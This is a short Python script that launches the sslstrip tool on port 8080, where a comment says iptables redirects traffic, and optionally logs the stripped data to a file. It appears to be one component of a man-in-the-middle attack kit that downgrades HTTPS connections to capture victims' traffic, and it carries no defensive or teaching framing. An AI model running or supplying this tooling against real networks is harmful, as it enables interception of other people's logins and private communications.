# ssl_strip_runner.py
import subprocess
import sys
import argparse


def main():
    parser = argparse.ArgumentParser(description="SSLstrip Runner")
    parser.add_argument("--log", help="Path to file for saving stripped data")
    args = parser.parse_args()

    print("+++ Starting sslstrip listener...")

    # We will listen on port 8080, as this is where iptables redirects traffic.
    cmd = ["sslstrip", "-l", "8080"]

    if args.log:
        cmd.extend(["-w", args.log])
        print("+++ SSLstrip will log data to: {}".format(args.log))

    # Start the sslstrip process
    try:
        sslstrip_proc = subprocess.Popen(cmd)
        sslstrip_proc.wait()  # Wait for the process to be terminated by the main script
    except Exception as e:
        print("! - SSLstrip error: {}".format(e))
        sys.exit(1)


if __name__ == "__main__":
    main()